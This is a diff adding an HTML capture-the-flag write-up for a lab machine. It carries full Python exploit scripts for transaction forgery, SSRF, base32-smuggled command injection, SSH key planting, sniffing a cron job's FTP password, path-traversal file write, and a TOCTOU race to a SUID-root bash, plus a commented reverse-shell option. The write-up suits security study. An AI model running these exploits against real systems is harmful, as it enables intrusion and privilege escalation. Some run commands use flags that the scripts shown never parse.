@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>BlockSynergy</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Oxanium:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="../css/style.css" />
+</head>
+<body>
+  <div class="layout">
+    <aside class="sidebar" id="sidebar">
+      <a href="../index.html" class="sidebar-logo">
+        <div class="logo-icon"><i class="bx bx-bot"></i></div>
+        <span class="logo-typewriter"><span id="typewriter"></span><span class="cursor-bar"></span></span>
+      </a>
+      <nav class="sidebar-nav">
+        <div class="nav-section">// INDEX</div>
+        <a href="../index.html" class="nav-link"><i class="bx bx-terminal"></i><span>OVERVIEW</span></a>
+        <a href="index.html" class="nav-link active"><i class="bx bx-file"></i><span>WRITEUPS</span></a>
+        <a href="../commands/index.html" class="nav-link"><i class="bx bx-code-alt"></i><span>COMMANDS</span></a>
+        <a href="../techniques/index.html" class="nav-link"><i class="bx bx-target-lock"></i><span>TECHNIQUES</span></a>
+      </nav>
+      <div class="sidebar-footer">
+        <div class="session"><span class="session-dot"></span><span>SESSION ACTIVE</span></div>
+        <button type="button" class="collapse-btn" id="collapseBtn"><i class="bx bx-left-arrow-alt"></i><span>collapse</span></button>
+      </div>
+    </aside>
+    <div class="main">
+      <div class="content">
+        <a href="index.html" class="back-link"><i class="bx bx-left-arrow-alt"></i> Back to writeups</a>
+
+        <div class="note-header">
+          <h1>BlockSynergy</h1>
+          <div class="note-meta">
+            <div class="row"> HTB Season <span class="highlight">11</span></div>
+            <div class="row"> Machine <span class="highlight">BlockSynergy</span></div>
+            <div class="row"> OS <span class="highlight">Linux</span></div>
+            <div class="row"> Difficulty <span class="highlight">Insane</span></div>
+            <div class="row"> Vulnerabilities [<span class="highlight">SSRF</span>] [<span class="highlight">Cmd Injection</span>] [<span class="highlight">Path Traversal</span>] [<span class="highlight">TOCTOU</span>]</div>
+          </div>
+        </div>
+
+        <div class="note-content">
+          <h2>1. Reconnaissance</h2>
+          <h3>Ports Scan</h3>
+          <pre><code>rustscan -a <span class="ph">&lt;target-ip&gt;</span> -- -sC -sV -oA nmap-result</code></pre>
+          <pre><code>PORT      STATE SERVICE     VERSION
+8080/tcp  open  http        Werkzeug/3.1.3 Python/3.12.3
+15432/tcp open  ftp         vsftpd 3.0.5
+46215/tcp open  ssh         OpenSSH
+47400-47470/tcp open  ???    docker-proxy -&gt; 172.18.0.2 (container)</code></pre>
+
+          <p><strong>Key Open Ports:</strong></p>
+          <ul>
+            <li><strong>8080/tcp</strong> – Flask wallet dashboard</li>
+            <li><strong>15432/tcp</strong> – FTP (vsftpd, docker-proxy → container)</li>
+            <li><strong>46215/tcp</strong> – SSH (OpenSSH)</li>
+            <li><strong>47400–47470/tcp</strong> – docker-proxy into the same container</li>
+          </ul>
+
+          <p>Let's add a hosts entry to keep things tidy:</p>
+          <pre><code>echo '<span class="ph">&lt;target-ip&gt;</span> blocksynergy.htb' | sudo tee -a /etc/hosts</code></pre>
+
+          <h3>Enumerate the Dashboard</h3>
+          <p>Browsing to <code>http://blocksynergy.htb:8080/</code> shows a Flask wallet dashboard. There's a “VIP Node Management” panel — but accessing it says <code>Permission Denied</code> unless the wallet has a balance <code>≥ 10</code>.</p>
+
+          <div class="callout info">
+            <strong>💡 Info</strong>
+            <code>devserver.service</code> — a “Smart Contract Development Server” (Flask) binds <code>127.0.0.1:5000</code> only. Unreachable from outside, reachable later from a shell.
+          </div>
+
+          <h2>2. Exploitation</h2>
+          <h3>Forge a VIP wallet</h3>
+          <p>The “VIP Node Management” surface requires a wallet with balance <code>≥ 10</code>. <code>calc_balance()</code> sums every transaction where our address is the <code>sender</code>/<code>receiver</code> — starting from zero, and including <strong>pending transactions</strong>:</p>
+          <pre><code>for pend_txn in pending_transactions:
+    if self.address == pend_txn['sender']:   self.balance -= pend_txn['amount']
+    elif self.address == pend_txn['receiver']: self.balance += pend_txn['amount']</code></pre>
+          <p><code>/broadcast_transaction</code> is <strong>unauthenticated</strong> and appends any JSON object (dedupe = exact dict match, so we vary the timestamp). Let's forge a credit to a wallet we control:</p>
+          <pre><code># create the wallet (python, ecdsa NIST256p) -&gt; /tmp/wallet.json
+python3 - &lt;&lt;'PY'
+import ecdsa, json
+sk = ecdsa.SigningKey.generate(curve=ecdsa.NIST256p)
+wk = sk.get_verifying_key().to_string().hex()
+open("/tmp/wallet.json","w").write(json.dumps({
+  "private_key": sk.to_string().hex(), "public_key": wk, "address": wk}))
+print("address:", wk)
+PY
+
+# inject a forged credit of 100 coins into the pending pool
+curl -s -X POST http://<span class="ph">&lt;target-ip&gt;</span>:8080/broadcast_transaction \
+  -H 'Content-Type: application/json' \
+  -d '{"timestamp":"2026-09-05T00:00:00-forged","sender":"00","receiver":"&lt;address&gt;","amount":100,"signature":"00"}'
+
+# load it -&gt; balance 100 &gt;= 10 -&gt; VIP UI unlocked
+curl -s -c cookies.jar -b cookies.jar http://<span class="ph">&lt;target-ip&gt;</span>:8080/dashboard/wallet \
+  -F "action=load" -F "file=@/tmp/wallet.json"</code></pre>
+          <div class="callout info">
+            <strong>💡 Why this works</strong>
+            The wallet is just the pairing of a hex <code>private_key</code>/<code>public_key</code>. Nothing validates that the incoming pending transaction was ever signed or mined — <code>calc_balance</code> trusts whatever is in the in-memory pool. One forged credit is enough to pass every <code>balance &lt; 10 → "Permission Denied"</code> gate.
+          </div>
+
+          <h3>SSRF → admin panel</h3>
+          <p>The admin panel is gated by <code>request.remote_addr == "127.0.0.1"</code> (app.py <code>is_admin()</code>). The node registry rejects only <em>loopback</em> hostnames (<code>ip_address(host).is_loopback</code>), but <strong><code>0.0.0.0</code> is not loopback</strong> — and connecting to it from inside the VM lands back on our own Flask process:</p>
+          <ol>
+            <li>Register a node whose URL is <code>http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&amp;target=&lt;payload&gt;</code>.</li>
+            <li>Trigger <code>/dashboard/vip/nodes/test_node/0</code> — the server does <code>requests.get(node_url)</code>, so <code>remote_addr</code> becomes <code>127.0.0.1</code> and the admin handler runs.</li>
+          </ol>
+
+          <h3>Command injection in <code>ping_node</code></h3>
+          <pre><code>ip = extract_ip_from_url(target)
+output = subprocess.check_output(f"ping -w 4{ip}", shell=True, ...)   # app.py:317</code></pre>
+          <p><code>extract_ip_from_url</code> only slices off <code>http(s)://</code>, then <code>.split('/')[0]</code> and <code>.split(':')[0]</code> — a <strong>chopper, not a sanitizer</strong>. Note there is <strong>no space</strong> between <code>-w 4</code> and <code>{ip}</code>. Injecting <code>ip = 127.0.0.1$(...)</code> yields <code>ping -w 4127.0.0.1$(...)</code> — ping fails on the bad argument, but the <code>$(...)</code> <strong>already executed</strong> through <code>shell=True</code>.</p>
+          <p>Because the value is split on <code>/</code> and <code>:</code>, the injected command must contain neither. base32’s alphabet (<code>A-Z2-7</code>, <code>=</code> padding) satisfies this:</p>
+          <pre><code>127.0.0.1$('echo'${IFS}&lt;BASE32&gt;|${IFS}base32${IFS}-d|${IFS}bash'')</code></pre>
+          <p>A root watchdog (<code>cleanup_node.sh</code>) pops our node off the registry every ~250 ms (<code>remove_node&amp;node_index=0</code>), so register→trigger is looped until it lands.</p>
+          <h3>RCE as <code>walter</code> — plant SSH key</h3>
+          <p>Craft the exploit script. It forges the wallet, loads it, then races <code>base32</code>-encoded payloads through <code>ping_node</code> until one lands as <code>walter</code>:</p>
+          <pre><code>#!/usr/bin/env python3
+"""exploit_stage1_rce.py — forge VIP wallet + SSRF + ping_node RCE as walter."""
+import base64, datetime as dt, json, os, socket, subprocess, sys, threading, time
+from urllib.parse import urlencode
+import ecdsa, requests
+
+TARGET = "http://<span class="ph">&lt;target-ip&gt;</span>:8080"
+
+def make_wallet():
+    sk = ecdsa.SigningKey.generate(curve=ecdsa.NIST256p)
+    vk = sk.get_verifying_key()
+    return {"private_key": sk.to_string().hex(),
+            "public_key": vk.to_string().hex(), "address": vk.to_string().hex()}
+
+def forge_credit(s, address):
+    for i in range(8):
+        txn = {"timestamp": dt.datetime.now().isoformat() + f"-f{i}",
+               "sender": "00", "receiver": address, "amount": 100, "signature": "00"}
+        s.post(f"{TARGET}/broadcast_transaction", json=txn, timeout=10)
+
+def fire(payload, duration=90):
+    s = requests.Session()
+    files = {"file": ("wallet.json", json.dumps(wallet).encode(), "application/json")}
+    s.post(f"{TARGET}/dashboard/wallet", data={"action": "load"}, files=files, timeout=10)
+    b32 = base64.b32encode(payload.encode()).decode()
+    target = f"127.0.0.1$('echo'${{IFS}}{b32}|${{IFS}}base32${{IFS}}-d|${{IFS}}bash'')"
+    node = f"http://0.0.0.0:8080/admin/nodes/manage?" + urlencode({"action": "ping_node", "target": target})
+    end = time.time() + duration
+    while time.time() &lt; end:
+        try:
+            s.post(f"{TARGET}/dashboard/vip/nodes", data={"action": "register", "node": node}, timeout=10)
+            s.get(f"{TARGET}/dashboard/vip/nodes/test_node/0", timeout=12)
+        except requests.exceptions.RequestException:
+            pass
+        time.sleep(0.25)
+
+wallet = make_wallet()
+forge_credit(requests.Session(), wallet["address"])
+
+with open(os.path.expanduser("~/.ssh/id_ed25519.pub")) as f:
+    pub = f.read().strip()
+plant = f"umask 077; mkdir -p /home/walter/.ssh; printf '%s\\n' '{pub}' &gt;&gt; /home/walter/.ssh/authorized_keys"
+fire(plant)
+print("[+] key planted. login with: ssh -i ~/.ssh/id_ed25519 walter@<span class="ph">&lt;target-ip&gt;</span>")</code></pre>
+
+          <p>Run the exploit:</p>
+          <pre><code># attacker — plant SSH key
+python3 exploit_stage1_rce.py --target http://<span class="ph">&lt;target-ip&gt;</span>:8080 \
+    --plant-key "$(cat ~/.ssh/id_ed25519.pub)"
+
+# or reverse shell (listener on attacker first):
+# python3 exploit_stage1_rce.py --target http://<span class="ph">&lt;target-ip&gt;</span>:8080 \
+#     --revshell <span class="ph">&lt;attacker-ip&gt;</span> 9001
+
+# login as walter
+ssh -i ~/.ssh/id_ed25519 walter@<span class="ph">&lt;target-ip&gt;</span></code></pre>
+          <pre><code>walter@blocksynergy:~$ id
+uid=1000(walter) gid=1000(walter) groups=1000(walter)
+walter@blocksynergy:~$ cat /home/walter/user.txt</code></pre>
+
+          <h2>3. Privilege Escalation</h2>
+          <h3>Leak the root cron’s FTP password</h3>
+          <p>The box self-heals: <code>/etc/crontab</code> runs <code>root /opt/backup/backup.sh</code> every 5 minutes, which tarballs the app dirs and uploads them to the containerized FTP on <code>15432</code>. The FTP credentials are embedded in the <code>curl</code> argument of a <strong>short-lived root process</strong> — visible for a split second in <code>/proc/*/cmdline</code>. Let's beat the process exit with a fast poller:</p>
+          <pre><code># run on the target as walter
+while :; do
+  for p in /proc/[0-9]*/cmdline; do
+    tr '\0' ' ' &lt; "$p" 2&gt;/dev/null | grep -q 'ftp://' &amp;&amp; { tr '\0' ' ' &lt; "$p"; echo; break; }
+  done
+  sleep 0.05
+done | tee /tmp/ftp_capture.log</code></pre>
+          <p>At the next <code>:00/:05/:10/:15</code> tick:</p>
+          <pre><code>/usr/bin/curl -T /tmp/_opt_blocksynergy.tar.gz ftp://ftpuser:&lt;pass&gt;@127.0.0.1:15432/upload/_opt_blocksynergy.tar.gz</code></pre>
+          <p>Let's verify access to the FTP root:</p>
+          <pre><code>curl -s ftp://ftpuser:&lt;pass&gt;@127.0.0.1:15432/upload/
+# _opt_blocksynergy.tar.gz , _opt_staging.tar.gz</code></pre>
+          <div class="callout info">
+            <strong>💡 Why bother</strong>
+            This confirms the cron↔FTP↔restore-dir topology the TOCTOU relies on (<code>/var/restore_work</code> mirrors the uploaded archives). It also gives write access to the FTP root — a second way to play the race, though the inotify swap in stage 3 is cleaner.
+          </div>
+
+          <h3>Lateral — write as <code>hank</code> via dev server path traversal</h3>
+          <p><code>devserver.service</code> (<code>127.0.0.1:5000</code>, user <code>hank</code>) is a “Smart Contract Development Server”. Its debug hooks were left enabled (contract.py):</p>
+          <pre><code>if self.debug == "True" and hook_val == "log":
+    file = self.contract["__meta__"]["log_file"]
+    logfile = f"/opt/staging/smart_contracts/logs/{file}"        # no normalization!
+    with open(logfile, "a") as f:
+        f.write(f"[{ts}] [{hook_name}] {content}\n")</code></pre>
+          <p><code>log_file</code> is joined directly onto the path — <code>../../../../</code> escapes to <code>/</code>. Every mint fires <code>on_mint</code> → <strong>arbitrary file write as hank</strong>, and <code>return_logs()</code> is the same path read back (a read primitive too).</p>
+
+          <div class="callout warning">
+            <strong>⚠️ Gotcha</strong>
+            <code>POST /</code> only 302s to <code>/dashboard</code>. Every mutation (upload, mint) must go to <strong><code>/dashboard</code></strong> itself; the session binds the mint to the just-uploaded contract. Leading <code>\n</code> in the hook content pushes the SSH key onto its own clean line; sshd ignores the junk timestamp line.
+          </div>
+
+          <p>Craft the script (run on the target — the port is loopback-only) and plant our key in <code>hank</code>'s <code>authorized_keys</code>:</p>
+          <pre><code>#!/usr/bin/env python3
+"""exploit_stage2_hank_write.py — run ON the target as walter (port 5000 is loopback)."""
+import json, os, re, sys
+from collections import OrderedDict
+import requests
+
+BASE = "http://127.0.0.1:5000"
+
+def contract_json(rel_path, content):
+    content = "\n" + content.strip("\n")            # leading \n = key sits on its own line
+    return OrderedDict([
+        ("name", "write"), ("owner", "Developer"), ("debug", "True"),
+        ("logic", {"mint": "allow"}), ("storage", {"balances": {}, "total_supply": 0}),
+        ("hooks", {"on_mint": "log"}),
+        ("__meta__", {
+            "log_file": rel_path,
+            "log_content": {"on_mint": content},
+        }),
+    ])
+
+s = requests.Session()
+content = open(os.path.expanduser("~/.ssh/id_ed25519.pub")).read().strip()
+contract = contract_json("../../../../home/hank/.ssh/authorized_keys", content)
+r1 = s.post(f"{BASE}/dashboard", data={"action": "upload_contract"},
+            files={"contract_file": ("c.json", json.dumps(contract).encode(), "application/json")}, timeout=15)
+assert "Contract loaded" in r1.text
+r2 = s.post(f"{BASE}/dashboard", data={"action": "contract_mint", "contract_mint_amount": "7"}, timeout=15)
+r3 = s.get(f"{BASE}/dashboard", timeout=15)                      # Log Output readback
+print("[+] key written" if "ssh-ed25519" in r3.text else "[-] failed")</code></pre>
+
+          <p>Run the exploit:</p>
+          <pre><code># attacker — push the script, run it on the target
+scp -i ~/.ssh/id_ed25519 exploit_stage2_hank_write.py walter@<span class="ph">&lt;target-ip&gt;</span>:/tmp/
+ssh -i ~/.ssh/id_ed25519 walter@<span class="ph">&lt;target-ip&gt;</span> 'python3 /tmp/exploit_stage2_hank_write.py'
+
+# [*] upload_contract -&gt; 200
+# [*] contract_mint   -&gt; 200
+# [+] OK: Log Output readback contains 'ssh-ed25519'
+
+# login as hank
+ssh -i ~/.ssh/id_ed25519 hank@<span class="ph">&lt;target-ip&gt;</span>
+hank@blocksynergy:~$ id
+uid=1001(hank) gid=1001(hank) groups=1001(hank),1002(developers)
+hank@blocksynergy:~$ ls -ld /var/restore_work
+drwxrwxr-x 5 root developers 4096 ... /var/restore_work</code></pre>
+
+          <div class="callout warning">
+            <strong>⚠️ Alternative Path</strong>
+            The older public walkthrough of BlockSynergy maps different users (keira → forge → paul → <code>sudo /usr/bin/pacman</code>). This instance's <code>/etc/passwd</code> is <code>walter</code>, <code>hank</code>, <code>mike</code>, <code>container-agent</code> — root here is taken through the restore-daemon TOCTOU below. If <code>ssh hank@…</code> still refuses (usually <code>.ssh</code>/<code>authorized_keys</code> modes under StrictModes), the primitive is still fully usable — it is the same mechanism that plants the payload archive for the root stage, and <code>/var/restore_work</code> is group-<code>developers</code> writable.
+          </div>
+
+          <h3>Privilege Escalation — restore-daemon TOCTOU → SUID bash</h3>
+          <p>The heal daemon (<code>restore.service</code>, user <code>root</code>) polls every ~10 s and watches <strong><code>/var/restore_work</code></strong>. The watch dir is <code>root:developers drwxrwxr-x</code> — writable by an account in the <code>developers</code> group (i.e. <code>hank</code>):</p>
+          <pre><code>/etc/crontab   */5 * * * *   root  /opt/backup/backup.sh
+                    tar czf /tmp/_opt_*.tar.gz  -&gt;  curl -T ftp://.../upload/
+
+restore.service  root  /bin/bash /opt/backup/restore_daemon.sh   (sleep-10 loop)
+                    watches /var/restore_work (inotify)
+                    new trusted archive -&gt; sha256 verify -&gt; tar -xzf  (as root!)</code></pre>
+          <p>Why we matter: a <code>developers</code> user can <strong>plant files there</strong>, and the daemon blindly <strong>extracts verified archives into <code>/</code></strong>.</p>
+          <p>The “verify then extract” pair is a <strong>TOCTOU</strong>: the file is read at verification time and again at extraction time. Swap in between → root-owned content of our choosing.</p>
+          <p>We win it by mirroring the daemon’s inotify stream: remember <code>CLOSE_WRITE</code>/<code>MOVED_TO</code> of a trusted name (file staged, hash already checked), then on the next <code>CREATE</code> of that name, atomically <code>rename</code> our malicious archive over it — the extraction then runs on <em>our</em> bytes.</p>
+          <p>The payload archive contains one member: <code>opt/blocksynergy/.diag</code> = <code>/bin/bash</code>, <code>mode 0o4755</code>, <code>uid/gid 0</code>. After extraction, <code>/opt/blocksynergy/.diag</code> is a <strong>SUID root bash</strong>.</p>
+
+          <p>Craft the exploit script (run on the target as a <code>developers</code> user):</p>
+          <pre><code>#!/usr/bin/env python3
+"""exploit_stage3_root.py — run ON the target as a 'developers' user (hank)."""
+import ctypes, io, os, re, shutil, stat, struct, subprocess, sys, tarfile, time
+import ctypes.util
+
+W, TRIG, MARK = "/var/restore_work", "/opt/staging/restore", "/opt/blocksynergy/.diag"
+NAMES = ("_opt_blocksynergy.tar.gz", "_opt_staging.tar.gz")
+
+tag = os.urandom(3).hex()
+SRC = f"{W}/.pl_{tag}.tar.gz"
+bash = open("/bin/bash", "rb").read()
+ti = tarfile.TarInfo("opt/blocksynergy/.diag")
+ti.size = len(bash); ti.mode = 0o4755; ti.uid = ti.gid = 0; ti.mtime = int(time.time())
+with tarfile.open(SRC, "w:gz") as t:
+    t.addfile(ti, io.BytesIO(bash))
+
+racer = f"""import ctypes,ctypes.util,os,shutil,struct,time
+W='{W}';SRC='{SRC}';MARK='{MARK}';NAMES={NAMES}
+CW,CN,CR,MV=0x8,0x10,0x100,0x80
+libc=ctypes.CDLL(ctypes.util.find_library('c'),use_errno=True)
+fd=libc.inotify_init();libc.inotify_add_watch(fd,W.encode(),CW|CN|CR|MV)
+os.set_blocking(fd,False);end=time.time()+400;done=set();lt=0
+while time.time()&lt;end:
+    if os.path.exists(MARK):break
+    if time.time()-lt&gt;2:
+        try:
+            if not os.path.exists('{TRIG}'):open('{TRIG}','w').close()
+        except Exception:pass
+        lt=time.time()
+    try:buf=os.read(fd,8192)
+    except (BlockingIOError,OSError):time.sleep(0.002);continue
+    i=0
+    while i+16&lt;=len(buf):
+        _w,mask,_c,ln=struct.unpack_from('iIII',buf,i);i+=16
+        nm=buf[i:i+ln].split(b'\\0',1)[0].decode(errors='replace');i+=ln
+        if not nm or nm.startswith('.pl_') or nm.endswith('.n'):continue
+        if mask&amp;(CW|MV) and nm in NAMES:done.add(nm)
+        elif mask&amp;CN and nm in done:
+            t=os.path.join(W,nm)
+            try:shutil.copyfile(SRC,t+'.n');os.rename(t+'.n',t)
+            except Exception:pass
+            done.discard(nm)
+print('won' if os.path.exists(MARK) else 'timeout')"""
+open(f"/tmp/.racer_{tag}.py", "w").write(racer)
+subprocess.Popen(["sh", "-c", f"setsid python3 /tmp/.racer_{tag}.py &gt;/tmp/.r_{tag}.log 2&gt;&amp;1 &amp;"])
+
+deadline = time.time() + 420
+while time.time() &lt; deadline:
+    try:
+        if stat.S_ISUID &amp; os.stat(MARK).st_mode:
+            out = subprocess.run([MARK, "-p", "-c", "id; cat /root/root.txt"],
+                                 capture_output=True, text=True).stdout
+            print(out); break
+    except FileNotFoundError:
+        time.sleep(2)</code></pre>
+
+          <p>Run the exploit:</p>
+          <pre><code># attacker — push the script, run it on the target
+scp -i ~/.ssh/id_ed25519 exploit_stage3_root.py hank@<span class="ph">&lt;target-ip&gt;</span>:/tmp/
+ssh -i ~/.ssh/id_ed25519 hank@<span class="ph">&lt;target-ip&gt;</span> 'python3 /tmp/exploit_stage3_root.py'
+
+# [*] payload /var/restore_work/.pl_1a2b3c.tar.gz (1446024 bytes)
+# [*] arming racer ...  (waiting for the */5 cron restore cycle, up to ~7 min)
+# [+] /opt/blocksynergy/.diag is now SUID (0o1004755)
+# uid=1000(hank) gid=1000(developers) euid=0(root) groups=1000(hank),1002(developers)</code></pre>
+
+          <div class="callout info">
+            <strong>📌 Why -p</strong>
+            A setuid bash drops privileges when it detects the SUID bit; <code>-p</code> tells it to keep the effective UID, so <code>euid=0(root)</code> while <code>uid</code> stays 1000 — enough to read <code>/root/root.txt</code>. Every 5-minute cron tick re-publishes a trusted archive, giving a fresh race window, so on timeout just re-run.
+          </div>
+
+          <h2>4. Flag Paths</h2>
+          <ul>
+            <li><strong>User flag:</strong> <code>/home/walter/user.txt</code> — forged VIP wallet → SSRF → <code>ping_node</code> command injection</li>
+            <li><strong>Root flag:</strong> <code>/root/root.txt</code> — restore-daemon inotify TOCTOU → SUID-root bash</li>
+          </ul>
+
+          <h2>Lessons</h2>
+          <ul class="lessons-list">
+            <li>Unauthenticated pending-tx injection forged VIP access — never trust an in-memory pool for authorization.</li>
+            <li><code>0.0.0.0</code> is not loopback; SSRF filters that only check <code>is_loopback</code> miss it.</li>
+            <li>A chopper (<code>split('/')</code>) is not a sanitizer — base32 smuggles the payload past it, and missing space in <code>ping -w 4{ip}</code> still executes <code>$(...)</code> via <code>shell=True</code>.</li>
+            <li>Debug-hook path join without normalization is arbitrary file write; mutations living only on <code>/dashboard</code> is an easy footgun.</li>
+            <li>Hash-verify-then-extract on a group-writable dir is a TOCTOU. Extract only after an atomic, exclusive open of the verified inode — and never as root into <code>/</code>.</li>
+          </ul>
+        </div>
+
+      </div>
+      <footer class="page-footer">// HACK THE PLANET — BUILD, BREAK, LEARN</footer>
+    </div>
+  </div>
+  <button type="button" class="mobile-toggle" id="mobileToggle" aria-label="Menu"><i class="bx bx-menu"></i></button>
+  <script src="../js/app.js"></script>
+  <script>
+    document.querySelectorAll('.note-content pre code').forEach(function (block) {
+      var html = block.innerHTML;
+      html = html.replace(/^(# .*)/gm, '<span class="comment">$1</span>');
+      var commands = ['wget','python3','sudo','rustscan','curl','ssh','scp','nc','echo','cat','cd','chmod','bash','tar','base32','tr','grep','tee','sleep','mkdir','ls'];
+      var regex = new RegExp('\\b(' + commands.join('|') + ')\\b(?= |$)', 'gm');
+      html = html.replace(regex, '<span class="cmd">$1</span>');
+      block.innerHTML = html;
+    });
+    document.querySelectorAll('.note-content pre').forEach(function (pre) {
+      if (pre.parentElement && pre.parentElement.classList.contains('code-wrap')) return;
+      var wrap = document.createElement('div');
+      wrap.className = 'code-wrap';
+      pre.parentNode.insertBefore(wrap, pre);
+      wrap.appendChild(pre);
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy-btn';
+      btn.textContent = 'Copy';
+      btn.addEventListener('click', function () {
+        var code = pre.querySelector('code');
+        var text = code ? code.innerText : pre.innerText;
+        navigator.clipboard.writeText(text).then(function () {
+          btn.textContent = 'Copied!';
+          btn.classList.add('copied');
+          setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+      });
+      wrap.appendChild(btn);
+    });
+    function toggleZoom(img) {
+      img.classList.toggle('expanded');
+      if (img.classList.contains('expanded')) {
+        setTimeout(function () { img.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+      }
+    }
+  </script>
+</body>
+</html>
